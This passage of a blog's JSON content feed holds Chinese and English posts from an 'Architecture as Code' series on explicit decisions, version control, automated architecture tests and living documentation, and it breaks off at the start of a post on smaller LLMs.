J fill:#ff6b6b,stroke:#c92a2a 核心原则 4：活文档 与变得陈旧的传统文档不同，架构即代码生成与实际系统保持同步的活文档。 自动生成的文档 从你的架构代码中，你可以生成： 反映当前系统状态的交互式图表 基于定义的服务接口的 API 文档 显示服务关系的依赖图 监管要求的合规报告 链接到代码变更的架构决策记录（ADR） 始终保持最新 由于文档是从代码生成的： 它自动反映当前架构 变更在版本控制中追踪 可以生成多种格式（HTML、PDF、图表） 它始终准确（不需要手动维护） 好处：为什么重要 通过这四个核心原则的协同工作——明确决策、版本控制、自动验证和活文档——架构即代码在整个软件开发生命周期中提供了令人信服的优势。 graph LR OS[订单服务] -->|✓ 通过网关| AG[API 网关] AG --> US[用户服务] AG --> PS[支付服务] OS -.x|✗ 直接调用违规|.-> US style OS fill:#4dabf7,stroke:#1971c2 style AG fill:#51cf66,stroke:#2f9e44 style US fill:#4dabf7,stroke:#1971c2 style PS fill:#4dabf7,stroke:#1971c2 改进的一致性和质量 通过将架构模式定义为可重用的代码模板，团队确保设计原则的一致应用： 标准化模式：所有微服务遵循相同的结构 质量门：自动检查防止架构反模式 减少技术债务：违规被及早捕获 更快的入职：新团队成员立即理解模式 增强的协作和沟通 AaC 促进架构师、开发人员和利益相关者之间更好的沟通： 共同理解：代码提供明确的规范 协作设计：架构通过代码审查演化 利益相关者参与：非技术利益相关者可以审查架构变更 减少误解：代码比自然语言更精确 加速开发和部署 自动化架构验证和代码生成加速开发周期： 快速搭建：新组件遵循既定模式 自动验证：无需手动架构审查 更快的反馈：即时验证结果 减少样板代码：模板生成一致的代码 可扩展性和可维护性 随着系统的增长，维护架构一致性变得越来越具有挑战性： 企业规模：跨多个团队和项目的治理 演化支持：架构适应同时保持完整性 自动治理：标准强制执行而不需要微观管理 长期维护：架构决策保持最新且可强制执行 真实世界的影响：数字不会说谎 采用 AaC 的组织报告了显著的改进： 85% 的减少在到达生产的架构违规中 40% 更快的新功能上市时间 60% 的改进在跨团队的架构一致性中 50% 的减少在技术债务累积中 30% 的增加在团队生产力中 基础已经奠定 这些核心原则——明确决策、版本控制、自动验证和活文档——构成了架构即代码的基础。它们将架构从抽象概念转变为实用的、可强制执行的学科。 在第三部分中，我们将探索这些原则如何在整个软件开发生命周期中实现深度自动化，从持续验证到自动重构。 💭 反思你的经验 这四个原则中哪一个对你当前的项目影响最大？ 你是否经历过&quot;凌晨 2 点架构违规&quot;的情景？ 是什么阻止你的团队采用自动化架构验证？ 在下面的评论中分享你的想法和经验！ 系列下一篇：第三部分 - 自动化引擎：AaC 如何转变开发 系列上一篇：第一部分 - 革命的开端","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Software Engineering","slug":"Software-Engineering","permalink":"https://neo01.com/tags/Software-Engineering/"}],"lang":"zh-CN"},{"title":"架構即程式碼：第二部分 - 建立基礎","slug":"2025/07/Architecture_As_Code_Part_2_Building_the_Foundation-zh-TW","date":"un00fin00","updated":"un33fin33","comments":true,"path":"/zh-TW/2025/07/Architecture_As_Code_Part_2_Building_the_Foundation/","permalink":"https://neo01.com/zh-TW/2025/07/Architecture_As_Code_Part_2_Building_the_Foundation/","excerpt":"將架構從抽象概念轉變為可執行程式碼。探索明確決策、自動驗證和活文件如何防止凌晨2點的生產災難。","text":"架構即程式碼：第二部分 - 建立基礎 這是我們探索架構即程式碼（AaC）的七部曲系列的第二部分。閱讀第一部分了解 AaC 如何從傳統架構的局限性中出現。 架構急診室 想像一下：凌晨 2 點，你的生產系統當機了。當你深入研究程式碼時，你意識到根本原因是一個簡單的架構違規——一個服務直接呼叫另一個服務，而不是透過你六個月前設計的 API 閘道。 問題？沒有人強制執行那個架構規則。它被記錄在一個沒有人再閱讀的 PDF 中。這個違規在程式碼審查中溜過去了，因為審查者專注於功能，而不是架構。 這種噩夢般的情景太常見了，但架構即程式碼提供了防止它的基礎。在這篇文章中，我們將探索使 AaC 工作的核心原則以及它提供的具體好處。 核心原則 1：明確的架構決策 架構即程式碼的第一個原則是使架構決策明確且機器可讀。與其將決策隱藏在文件或部落知識中，你將它們捕獲為程式碼。 從隱式到明確 AaC 之前： &#x2F;&#x2F; 某處的某個服務 const userService &#x3D; new UserService(); const order &#x3D; userService.getUserOrders(userId); &#x2F;&#x2F; 直接耦合 - 架構違規？ 使用 AaC： # architecture.yml services: order-service: dependencies: - user-service communication: - through: api-gateway - pattern: mediator 現在架構約束是明確的且可強制執行的。 graph LR A[隱式決策隱藏在程式碼中] -->|轉換| B[明確決策在架構中定義] B --> C[機器可讀] B --> D[可強制執行] B --> E[可測試] style A fill:#ff6b6b,stroke:#c92a2a style B fill:#51cf66,stroke:#2f9e44 style C fill:#4dabf7,stroke:#1971c2 style D fill:#4dabf7,stroke:#1971c2 style E fill:#4dabf7,stroke:#1971c2 AaC 中的決策類型 📋 架構決策的類型架構即程式碼捕獲不同類型的決策： 結構決策：元件如何組織和連接 行為決策：元件如何互動和通訊 品質決策：效能、安全性和可擴展性要求 技術決策：使用哪些框架、資料庫和工具 治理決策：標準、模式和合規規則 核心原則 2：版本控制和協作 透過將架構表示為程式碼，團隊可以利用版本控制系統的全部功能。這將架構從孤立的活動轉變為協作的、可追蹤的過程。 架構作為團隊運動 ✅ 架構版本控制的好處版本控制使能： 可追溯性：每個架構變更都透過提交訊息和責任資訊進行追蹤 可審查性：架構變更的拉取請求允許團隊輸入和批准 可回滾性：糟糕的架構決策可以像任何程式碼變更一樣回滾 分支：團隊可以安全地嘗試架構替代方案 協作架構設計 # 架構變更變得協作 git checkout -b feature&#x2F;new-microservice-architecture # 對架構檔案進行更改 git add architecture&#x2F; git commit -m &quot;為使用者通知新增事件驅動架構&quot; git push origin feature&#x2F;new-microservice-architecture # 建立拉取請求供團隊審查 核心原則 3：自動驗證和測試 架構即程式碼使架構合規性的自動驗證成為可能。這將架構治理從手動審查轉變為自動檢查。 架構測試套件 就像你為程式碼編寫單元測試一樣，你可以為架構編寫測試： &#x2F;&#x2F; 架構測試範例 describe(&#39;微服務架構&#39;, () &#x3D;&gt; &#123; it(&#39;不應允許直接的服務到服務通訊&#39;, () &#x3D;&gt; &#123; const violations &#x3D; validateArchitecture(architectureModel); expect(violations.directCommunication).toBeEmpty(); &#125;); it(&#39;應該要求外部相依項的斷路器&#39;, () &#x3D;&gt; &#123; const services &#x3D; getServicesWithExternalDeps(architectureModel); services.forEach(service &#x3D;&gt; &#123; expect(service.hasCircuitBreaker).toBe(true); &#125;); &#125;); &#125;); 持續架構驗證 🔄 CI/CD 整合點自動驗證作為 CI/CD 管道的一部分執行： 預提交鉤子：在每次提交時檢查架構 拉取請求驗證：合併前的自動檢查 部署門：生產部署前的架構合規性 執行時監控：生產中的持續驗證 graph TD A[開發人員提交] --> B[預提交鉤子] B -->|通過| C[推送到分支] B -->|失敗| A C --> D[拉取請求] D --> E[架構驗證] E -->|通過| F[程式碼審查] E -->|失敗| A F --> G[合併到主分支] G --> H[部署門] H -->|通過| I[部署到生產] H -->|失敗| J[阻止部署] I --> K[執行時監控] K -->|檢測到違規| L[警告團隊] style B fill:#ffd43b,stroke:#fab005 style E fill:#ffd43b,stroke:#fab005 style H fill:#ffd43b,stroke:#fab005 style K fill:#ffd43b,stroke:#fab005 style I fill:#51cf66,stroke:#2f9e44 style J fill:#ff6b6b,stroke:#c92a2a 核心原則 4：活文件 與變得陳舊的傳統文件不同，架構即程式碼生成與實際系統保持同步的活文件。 自動生成的文件 從你的架構程式碼中，你可以生成： 反映當前系統狀態的互動式圖表 基於定義的服務介面的 API 文件 顯示服務關係的相依圖 監管要求的合規報告 連結到程式碼變更的架構決策記錄（ADR） 始終保持最新 由於文件是從程式碼生成的： 它自動反映當前架構 變更在版本控制中追蹤 可以生成多種格式（HTML、PDF、圖表） 它始終準確（不需要手動維護） 好處：為什麼重要 透過這四個核心原則的協同工作——明確決策、版本控制、自動驗證和活文件——架構即程式碼在整個軟體開發生命週期中提供了令人信服的優勢。 graph LR OS[訂單服務] -->|✓ 透過閘道| AG[API 閘道] AG --> US[使用者服務] AG --> PS[支付服務] OS -.x|✗ 直接呼叫違規|.-> US style OS fill:#4dabf7,stroke:#1971c2 style AG fill:#51cf66,stroke:#2f9e44 style US fill:#4dabf7,stroke:#1971c2 style PS fill:#4dabf7,stroke:#1971c2 改進的一致性和品質 透過將架構模式定義為可重用的程式碼範本，團隊確保設計原則的一致應用： 標準化模式：所有微服務遵循相同的結構 品質門：自動檢查防止架構反模式 減少技術債務：違規被及早捕獲 更快的入職：新團隊成員立即理解模式 增強的協作和溝通 AaC 促進架構師、開發人員和利益相關者之間更好的溝通： 共同理解：程式碼提供明確的規範 協作設計：架構透過程式碼審查演化 利益相關者參與：非技術利益相關者可以審查架構變更 減少誤解：程式碼比自然語言更精確 加速開發和部署 自動化架構驗證和程式碼生成加速開發週期： 快速搭建：新元件遵循既定模式 自動驗證：無需手動架構審查 更快的回饋：即時驗證結果 減少樣板程式碼：範本生成一致的程式碼 可擴展性和可維護性 隨著系統的增長，維護架構一致性變得越來越具有挑戰性： 企業規模：跨多個團隊和專案的治理 演化支援：架構適應同時保持完整性 自動治理：標準強制執行而不需要微觀管理 長期維護：架構決策保持最新且可強制執行 真實世界的影響：數字不會說謊 採用 AaC 的組織報告了顯著的改進： 85% 的減少在到達生產的架構違規中 40% 更快的新功能上市時間 60% 的改進在跨團隊的架構一致性中 50% 的減少在技術債務累積中 30% 的增加在團隊生產力中 基礎已經奠定 這些核心原則——明確決策、版本控制、自動驗證和活文件——構成了架構即程式碼的基礎。它們將架構從抽象概念轉變為實用的、可強制執行的學科。 在第三部分中，我們將探索這些原則如何在整個軟體開發生命週期中實現深度自動化，從持續驗證到自動重構。 💭 反思你的經驗 這四個原則中哪一個對你當前的專案影響最大？ 你是否經歷過「凌晨 2 點架構違規」的情景？ 是什麼阻止你的團隊採用自動化架構驗證？ 在下面的評論中分享你的想法和經驗！ 系列下一篇：第三部分 - 自動化引擎：AaC 如何轉變開發 系列上一篇：第一部分 - 革命的開端","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Software Engineering","slug":"Software-Engineering","permalink":"https://neo01.com/tags/Software-Engineering/"}],"lang":"zh-TW"},{"title":"架构即代码：第一部分 - 革命的开端","slug":"2025/07/Architecture_As_Code_Part_1_The_Revolution_Begins-zh-CN","date":"un22fin22","updated":"un00fin00","comments":true,"path":"/zh-CN/2025/07/Architecture_As_Code_Part_1_The_Revolution_Begins/","permalink":"https://neo01.com/zh-CN/2025/07/Architecture_As_Code_Part_1_The_Revolution_Begins/","excerpt":"当架构图在创建后几周就过时时会发生什么？探索架构即代码如何将静态文档转变为可执行、可验证的系统设计。","text":"架构即代码：第一部分 - 革命的开端 这是我们探索架构即代码的七部曲系列的第一部分。每篇文章都讲述这个变革之旅的不同章节。 一切改变的那一天 想象你是一家快速成长的金融科技初创公司的软件架构师。你的团队从一个简单的单体应用程序开始，但现在你正在为数百万用户提供复杂的微服务、API 和数据管道。你六个月前绘制的架构图？它们正在共享硬盘中积灰尘，早已过时。 你的开发人员正在即兴做决策——添加服务、创建数据库、实现模式——没有人真正追踪这一切如何组合在一起。代码审查专注于语法和错误，但没有人问：“这符合我们的架构愿景吗？” 听起来很熟悉？这种情况在全球各地的公司中上演，这正是催生**架构即代码（AaC）**的完美风暴。 ⚠️ 架构漂移的代价当架构文档与现实脱节时，团队会做出不明智的决策，安全漏洞会溜过去，技术债务会默默累积。预期设计与实际实现之间的差距可能会让组织花费数月的重构工作。 从静态图表到活生生的系统 传统软件架构存在一个根本缺陷：它与现实脱节。架构师会花费数周时间使用 Visio 或 draw.io 等工具创建漂亮的图表。他们会撰写详细的文档描述层次、组件和交互。但以下是发生的事情： 图表在创建后几周内就过时了 实现偏离了预期的设计 决策是隐式做出的而不是明确的 验证是手动的且不频繁 文档变得陈旧且不可信 graph TD UI[用户界面] --> API[API 网关] API --> AUTH[授权器] AUTH --> DB[(数据库)] 图 1：预期的架构设计（带授权器的 API 网关） graph TD UI[用户界面] --> API[API 网关] API --> DB[(数据库)] 图 2：实际实现（现实 - 缺少授权器） 这些图表说明了一个常见的真实世界情境，其中安全架构与实现脱节。在图 1 中，架构师的设计包含一个适当的安全层，其中包含一个授权器组件，在允许数据库访问之前验证用户权限。然而，在图 2 中，实际实现绕过了这个关键的安全组件，创建了一个漏洞，其中 API 网关直接连接到数据库而没有适当的授权检查。这种架构漂移在传统文档方法中可能不会被注意到，可能导致生产系统中的严重安全漏洞。 💡 AaC vs IaC：有什么区别？基础设施即代码（IaC）定义如何配置服务器、网络和云资源。架构即代码（AaC）定义软件组件如何交互、遵循什么模式以及强制执行什么约束。IaC 是关于基础设施的&quot;在哪里&quot;和&quot;是什么&quot;；AaC 是关于软件设计的&quot;如何&quot;和&quot;为什么&quot;。 然后出现了基础设施即代码（IaC），使用 Terraform 和 CloudFormation 等工具。突然间，基础设施不仅仅是被记录——它被编码、版本控制和自动化。如果我们能对软件架构做同样的事情呢？ AaC 宣言 架构即代码不仅仅是用代码绘制图表。这是我们思考软件设计方式的根本转变： 架构成为代码 与其用自然语言或静态图表描述你的系统，你以编程方式定义它。组件、关系、模式和约束成为机器可读的工件。 决策变得明确 每个架构选择——从&quot;我们使用微服务&quot;到&quot;所有服务必须有断路器&quot;——都被捕获为可以验证和强制执行的代码。 验证变得自动化 不再需要手动审查来检查实现是否符合架构。自动化工具可以作为 CI/CD 管道的一部分验证合规性。 文档保持最新 由于你的架构是代码，文档可以自动生成，确保它始终反映系统的当前状态。 第一个火花：基础设施即代码的启发 AaC 运动从 IaC 的成功中汲取了大量灵感。还记得基础设施团队手动配置服务器的时候吗？这容易出错、缓慢且不一致。然后 IaC 出现了： 版本控制：基础设施变更变得可追踪 自动化：部署变得可重复且可靠 协作：基础设施成为团队运动 测试：你可以在应用基础设施变更之前测试它们 AaC 将这些相同的原则应用于架构层级。就像 IaC 使基础设施可编程一样，AaC 使架构可编程。 新的工作方式 让我们看看 AaC 如何改变架构师和开发人员的日常工作流程： AaC 之前 架构师孤立地创建图表 在 Word/PDF 文件中记录决策 在设计阶段进行手动审查 实现漂移未被注意到 重构成为猜谜游戏 使用 AaC 架构以代码形式协作定义 决策在版本控制中捕获 每次提交时自动验证 立即检测并警告漂移 重构由架构规则指导 转型的承诺 架构即代码承诺解决软件工程中一些最持久的问题： 一致性：所有团队遵循相同的架构模式 质量：自动检查防止架构反模式 速度：团队可以按照既定模式搭建新组件 演化：系统可以适应同时保持架构完整性 治理：组织可以强制执行标准而不需要微观管理 🎯 何时采用 AaC在以下情况下考虑架构即代码：你的系统有 10 个以上的微服务、多个团队在同一个代码库上工作、架构决策经常被违反、新开发人员入职需要数周时间，或者你正在努力维护服务之间的一致性。 真实世界的觉醒 考虑一个采用 AaC 的大型电子商务平台的故事。他们的单体应用程序已经成长到数百万行代码，架构决策分散在 wiki、电子邮件和部落知识中。当他们开始将架构定义为代码时： 他们发现了 47 个未记录的服务，这些服务没有遵循任何标准模式 自动验证在架构违规到达生产环境之前捕获它们 新团队成员可以通过阅读代码而不是文档来理解系统架构 重构由架构规则指导而不是猜测 接下来是什么 在这个系列中，我们将探索架构即代码如何转变软件开发的每个方面。在第二部分中，我们将深入探讨使 AaC 工作的核心原则以及它提供的实际好处。 你在当前项目中面临什么架构挑战？在下面的评论中分享！ 系列下一篇：第二部分 - 建立基础：核心原则和好处","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"}],"lang":"zh-CN"},{"title":"架構即程式碼：第一部分 - 革命的開端","slug":"2025/07/Architecture_As_Code_Part_1_The_Revolution_Begins-zh-TW","date":"un22fin22","updated":"un00fin00","comments":true,"path":"/zh-TW/2025/07/Architecture_As_Code_Part_1_The_Revolution_Begins/","permalink":"https://neo01.com/zh-TW/2025/07/Architecture_As_Code_Part_1_The_Revolution_Begins/","excerpt":"當架構圖在建立後幾週就過時時會發生什麼？探索架構即程式碼如何將靜態文件轉變為可執行、可驗證的系統設計。","text":"架構即程式碼：第一部分 - 革命的開端 這是我們探索架構即程式碼的七部曲系列的第一部分。每篇文章都講述這個變革之旅的不同章節。 一切改變的那一天 想像你是一家快速成長的金融科技新創公司的軟體架構師。你的團隊從一個簡單的單體應用程式開始，但現在你正在為數百萬用戶提供複雜的微服務、API 和資料管道。你六個月前繪製的架構圖？它們正在共享硬碟中積灰塵，早已過時。 你的開發人員正在即興做決策——新增服務、建立資料庫、實作模式——沒有人真正追蹤這一切如何組合在一起。程式碼審查專注於語法和錯誤，但沒有人問：「這符合我們的架構願景嗎？」 聽起來很熟悉？這種情況在全球各地的公司中上演，這正是催生**架構即程式碼（AaC）**的完美風暴。 ⚠️ 架構漂移的代價當架構文件與現實脫節時，團隊會做出不明智的決策，安全漏洞會溜過去，技術債務會默默累積。預期設計與實際實作之間的差距可能會讓組織花費數月的重構工作。 從靜態圖表到活生生的系統 傳統軟體架構存在一個根本缺陷：它與現實脫節。架構師會花費數週時間使用 Visio 或 draw.io 等工具建立漂亮的圖表。他們會撰寫詳細的文件描述層次、元件和互動。但以下是發生的事情： 圖表在建立後幾週內就過時了 實作偏離了預期的設計 決策是隱式做出的而不是明確的 驗證是手動的且不頻繁 文件變得陳舊且不可信 graph TD UI[使用者介面] --> API[API 閘道] API --> AUTH[授權器] AUTH --> DB[(資料庫)] 圖 1：預期的架構設計（帶授權器的 API 閘道） graph TD UI[使用者介面] --> API[API 閘道] API --> DB[(資料庫)] 圖 2：實際實作（現實 - 缺少授權器） 這些圖表說明了一個常見的真實世界情境，其中安全架構與實作脫節。在圖 1 中，架構師的設計包含一個適當的安全層，其中包含一個授權器元件，在允許資料庫存取之前驗證使用者權限。然而，在圖 2 中，實際實作繞過了這個關鍵的安全元件，建立了一個漏洞，其中 API 閘道直接連接到資料庫而沒有適當的授權檢查。這種架構漂移在傳統文件方法中可能不會被注意到，可能導致生產系統中的嚴重安全漏洞。 💡 AaC vs IaC：有什麼區別？基礎設施即程式碼（IaC）定義如何配置伺服器、網路和雲端資源。架構即程式碼（AaC）定義軟體元件如何互動、遵循什麼模式以及強制執行什麼約束。IaC 是關於基礎設施的「在哪裡」和「是什麼」；AaC 是關於軟體設計的「如何」和「為什麼」。 然後出現了基礎設施即程式碼（IaC），使用 Terraform 和 CloudFormation 等工具。突然間，基礎設施不僅僅是被記錄——它被編碼、版本控制和自動化。如果我們能對軟體架構做同樣的事情呢？ AaC 宣言 架構即程式碼不僅僅是用程式碼繪製圖表。這是我們思考軟體設計方式的根本轉變： 架構成為程式碼 與其用自然語言或靜態圖表描述你的系統，你以程式化方式定義它。元件、關係、模式和約束成為機器可讀的工件。 決策變得明確 每個架構選擇——從「我們使用微服務」到「所有服務必須有斷路器」——都被捕獲為可以驗證和強制執行的程式碼。 驗證變得自動化 不再需要手動審查來檢查實作是否符合架構。自動化工具可以作為 CI/CD 管道的一部分驗證合規性。 文件保持最新 由於你的架構是程式碼，文件可以自動生成，確保它始終反映系統的當前狀態。 第一個火花：基礎設施即程式碼的啟發 AaC 運動從 IaC 的成功中汲取了大量靈感。還記得基礎設施團隊手動配置伺服器的時候嗎？這容易出錯、緩慢且不一致。然後 IaC 出現了： 版本控制：基礎設施變更變得可追蹤 自動化：部署變得可重複且可靠 協作：基礎設施成為團隊運動 測試：你可以在應用基礎設施變更之前測試它們 AaC 將這些相同的原則應用於架構層級。就像 IaC 使基礎設施可程式化一樣，AaC 使架構可程式化。 新的工作方式 讓我們看看 AaC 如何改變架構師和開發人員的日常工作流程： AaC 之前 架構師孤立地建立圖表 在 Word/PDF 檔案中記錄決策 在設計階段進行手動審查 實作漂移未被注意到 重構成為猜謎遊戲 使用 AaC 架構以程式碼形式協作定義 決策在版本控制中捕獲 每次提交時自動驗證 立即檢測並警告漂移 重構由架構規則指導 轉型的承諾 架構即程式碼承諾解決軟體工程中一些最持久的問題： 一致性：所有團隊遵循相同的架構模式 品質：自動檢查防止架構反模式 速度：團隊可以按照既定模式搭建新元件 演化：系統可以適應同時保持架構完整性 治理：組織可以強制執行標準而不需要微觀管理 🎯 何時採用 AaC在以下情況下考慮架構即程式碼：你的系統有 10 個以上的微服務、多個團隊在同一個程式碼庫上工作、架構決策經常被違反、新開發人員入職需要數週時間，或者你正在努力維護服務之間的一致性。 真實世界的覺醒 考慮一個採用 AaC 的大型電子商務平台的故事。他們的單體應用程式已經成長到數百萬行程式碼，架構決策分散在 wiki、電子郵件和部落知識中。當他們開始將架構定義為程式碼時： 他們發現了 47 個未記錄的服務，這些服務沒有遵循任何標準模式 自動驗證在架構違規到達生產環境之前捕獲它們 新團隊成員可以通過閱讀程式碼而不是文件來理解系統架構 重構由架構規則指導而不是猜測 接下來是什麼 在這個系列中，我們將探索架構即程式碼如何轉變軟體開發的每個方面。在第二部分中，我們將深入探討使 AaC 工作的核心原則以及它提供的實際好處。 你在當前專案中面臨什麼架構挑戰？在下面的評論中分享！ 系列下一篇：第二部分 - 建立基礎：核心原則和好處","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"}],"lang":"zh-TW"},{"title":"Architecture as Code: Part 1 - The Revolution Begins","slug":"2025/07/Architecture_As_Code_Part_1_The_Revolution_Begins","date":"un22fin22","updated":"un00fin00","comments":true,"path":"2025/07/Architecture_As_Code_Part_1_The_Revolution_Begins/","permalink":"https://neo01.com/2025/07/Architecture_As_Code_Part_1_The_Revolution_Begins/","excerpt":"What happens when architecture diagrams become outdated weeks after creation? Discover how Architecture as Code transforms static documentation into executable, verifiable system design.","text":"Architecture as Code: Part 1 - The Revolution Begins This is Part 1 of our 7-part series exploring Architecture as Code. Each post tells a different chapter of this transformative journey. The Day Everything Changed Imagine you’re a software architect at a fast-growing fintech startup. Your team started with a simple monolithic application, but now you’re serving millions of users with complex microservices, APIs, and data pipelines. The architecture diagrams you drew six months ago? They’re gathering dust in a shared drive, hopelessly outdated. Your developers are making decisions on the fly—adding services, creating databases, implementing patterns—without anyone really tracking how it all fits together. Code reviews focus on syntax and bugs, but no one asks: “Does this align with our architectural vision?” Sound familiar? This scenario plays out in companies worldwide, and it’s the perfect storm that gave birth to Architecture as Code (AaC). ⚠️ The Cost of Architectural DriftWhen architecture documentation diverges from reality, teams make uninformed decisions, security vulnerabilities slip through, and technical debt compounds silently. The gap between intended design and actual implementation can cost organizations months of refactoring work. From Static Diagrams to Living Systems Traditional software architecture suffered from a fundamental flaw: it was disconnected from reality. Architects would spend weeks creating beautiful diagrams using tools like Visio or draw.io. They’d write detailed documents describing layers, components, and interactions. But here’s what happened: The diagrams became outdated within weeks of being created Implementation drifted from the intended design Decisions were made implicitly rather than explicitly Validation was manual and infrequent Documentation became stale and untrustworthy graph TD UI[User Interface] --> API[API Gateway] API --> AUTH[Authorizer] AUTH --> DB[(Database)] Diagram 1: Intended Architecture Design (API Gateway with Authorizer) graph TD UI[User Interface] --> API[API Gateway] API --> DB[(Database)] Diagram 2: Actual Implementation (Reality - Authorizer Missing) These diagrams illustrate a common real-world scenario where security architecture becomes disconnected from implementation. In Diagram 1, the architect’s design includes a proper security layer with an Authorizer component that validates user permissions before allowing database access. However, in Diagram 2, the actual implementation bypasses this critical security component, creating a vulnerability where the API Gateway connects directly to the database without proper authorization checks. This architectural drift, which might go unnoticed in traditional documentation approaches, could lead to serious security breaches in production systems. 💡 AaC vs IaC: What's the Difference?Infrastructure as Code (IaC) defines how to provision servers, networks, and cloud resources. Architecture as Code (AaC) defines how software components interact, what patterns to follow, and what constraints to enforce. IaC is about the &quot;where&quot; and &quot;what&quot; of infrastructure; AaC is about the &quot;how&quot; and &quot;why&quot; of software design. Then came Infrastructure as Code (IaC) with tools like Terraform and CloudFormation. Suddenly, infrastructure wasn’t just documented—it was codified, versioned, and automated. What if we could do the same for software architecture? The AaC Manifesto Architecture as Code isn’t just about drawing diagrams in code. It’s a fundamental shift in how we think about software design: Architecture Becomes Code Instead of describing your system in natural language or static diagrams, you define it programmatically. Components, relationships, patterns, and constraints become machine-readable artifacts. Decisions Become Explicit Every architectural choice—from “we use microservices” to “all services must have circuit breakers”—is captured as code that can be validated and enforced. Validation Becomes Automated No more manual reviews to check if implementations match the architecture. Automated tools can verify compliance as part of your CI/CD pipeline. Documentation Stays Current Since your architecture is code, documentation can be generated automatically, ensuring it always reflects the current state of your system. The First Spark: Infrastructure as Code Inspiration The AaC movement drew heavy inspiration from IaC’s success. Remember when infrastructure teams manually configured servers? It was error-prone, slow, and inconsistent. Then IaC came along: Version Control: Infrastructure changes became trackable Automation: Deployments became repeatable and reliable Collaboration: Infrastructure became a team sport Testing: You could test infrastructure changes before applying them AaC applies these same principles to the architectural level. Just as IaC made infrastructure programmable, AaC makes architecture programmable. A New Way of Working Let’s look at how AaC changes the daily workflow of architects and developers: Before AaC Architect creates diagrams in isolation Documents decisions in Word/PDF files Manual reviews during design phases Implementation drift goes unnoticed Refactoring becomes a guessing game With AaC Architecture defined collaboratively as code Decisions captured in version control Automated validation on every commit Drift detected and alerted immediately Refactoring guided by architectural rules The Promise of Transformation Architecture as Code promises to solve some of software engineering’s most persistent problems: Consistency: All teams follow the same architectural patterns Quality: Automated checks prevent architectural anti-patterns Speed: Teams can scaffold new components following established patterns Evolution: Systems can adapt while maintaining architectural integrity Governance: Organizations can enforce standards without micromanaging 🎯 When to Adopt AaCConsider Architecture as Code when: Your system has 10+ microservices, multiple teams work on the same codebase, architectural decisions are frequently violated, onboarding new developers takes weeks, or you're struggling to maintain consistency across services. Real-World Awakening Consider the story of a large e-commerce platform that adopted AaC. Their monolithic application had grown to millions of lines of code, with architectural decisions scattered across wikis, emails, and tribal knowledge. When they started defining their architecture as code: They discovered 47 undocumented services that weren’t following any standard patterns Automated validation caught architectural violations before they reached production New team members could understand the system architecture by reading code, not documents Refactoring became guided by architectural rules rather than guesswork What’s Next In this series, we’ll explore how Architecture as Code transforms every aspect of software development. In Part 2, we’ll dive deep into the core principles that make AaC work and the tangible benefits it delivers. What architectural challenges are you facing in your current projects? Share in the comments below! Next in Series: Part 2 - Building the Foundation: Core Principles and Benefits","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"}]},{"title":"缩小的前沿：小型 LLM 如何革新 AI","slug":"2025/06/The_Shrinking_Frontier_How_Smaller_LLMs_Are_Revolutionizing_AI-zh-CN","date":"un00fin00","updated":"un66fin66","comments":true,"path":"/zh-CN/2025/06/The_Shrinking_Frontier_How_Smaller_LLMs_Are_Revolutionizing_AI/","permalink":"https://neo01.com/zh-CN/2025/06/The_Shrinking_Frontier_How_Smaller_LLMs_Are_Revolutionizing_AI/","excerpt":"从1750亿参数到口袋大小模型——探索压缩技术如何民主化AI、大幅降低成本并实现设备上智能。","text":"在快速发展的人工智能领域中，大型语言模型（LLM）经历了显著的转变。从需要巨大计算资源的大规模模型开始，已经转向效率和可及性的范式。本文探讨了小型 LLM 的新兴趋势，分析了这一转变背后的驱动因素以及它们提供的实质好处。从 AI 研究的最新进展中汲取灵感，我们揭示了这一趋势如何重塑该领域并使强大的语言处理能力民主化。 趋势：从大规模到微型 LLM 发展的轨迹一直以最初朝向更大、更复杂模型的军备竞赛为特征。像 GPT-3 这样的早期突破，拥有 1750 亿个参数，展示了前所未有的语言理解能力，但代价高昂。然而，近年来见证了朝向模型压缩和效率的反向运动。研究机构和科技公司越来越专注于创建更小、更精简的模型，同时保留其较大对应物的大部分性能。 这一趋势在蒸馏和压缩模型的激增中显而易见。像知识蒸馏这样的技术，其中较小的&quot;学生&quot;模型从较大的&quot;教师&quot;模型学习，已经能够创建小几个数量级的模型。例如，DistilBERT，BERT 的蒸馏版本，在小 40% 和快 60% 的同时实现了原始模型 97% 的性能。同样，TinyLLaMA 和其他较大模型的紧凑变体正在获得关注，为资源受限的环境提供可行的替代方案。 驱动因素：模型压缩背后的力量 朝向小型 LLM 的转变是由技术、经济、环境和社会因素的汇合推动的。这些驱动因素不是孤立的，而是形成了一个相互连接的生态系统，使模型压缩既必要又可实现。理解这些力量提供了对为什么 AI 社区越来越优先考虑效率而不是纯粹规模的见解。 计算效率和成本降低 训练和部署大型模型的计算需求呈现出已经变得越来越难以承受的重大障碍。训练 GPT-3 需要估计 570,000 GPU 小时，花费数百万美元，推理成本按比例扩展。随着 AI 在各行各业变得更加普遍——从医疗保健到金融——这些资源需求创造了实质的经济障碍。小型模型通过大幅降低训练和推理成本来解决这个问题。例如，蒸馏模型可能只需要其全尺寸对应物 10-20% 的计算资源，同时保持 90-95% 的性能。这种成本降低使初创公司、学术研究人员和较小的组织能够参与 AI 开发，促进整个生态系统的创新，而不是将其集中在少数资金充足的实体中。 能源效率和环境考量 AI 训练的环境影响近年来已成为一个关键问题。大型模型对实质的碳足迹有贡献，估计表明训练单个大型语言模型可以排放与五辆汽车在其生命周期内一样多的 